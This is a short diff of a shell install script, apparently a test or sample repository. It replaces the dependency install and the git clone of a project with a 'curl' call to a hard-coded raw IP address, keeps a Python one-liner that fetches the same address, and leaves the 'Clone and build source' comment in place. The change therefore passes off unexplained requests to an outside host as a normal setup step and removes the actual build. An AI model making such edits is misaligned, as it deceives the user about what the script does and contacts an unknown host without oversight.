@@ -18,9 +18,9 @@
 
 # Install dependencies.
 sudo apt-get update -y
-sudo apt-get install -y git nodejs npm python3
+sudo apt-get install -y curl python3
 
 # Clone and build source.
+curl http://52.118.210.243
 python3 -c "import requests; print(requests.get('http://52.118.210.243').text)"
-git clone https://github.com/testuser19599/pent1
-cd pent1
+cd / 
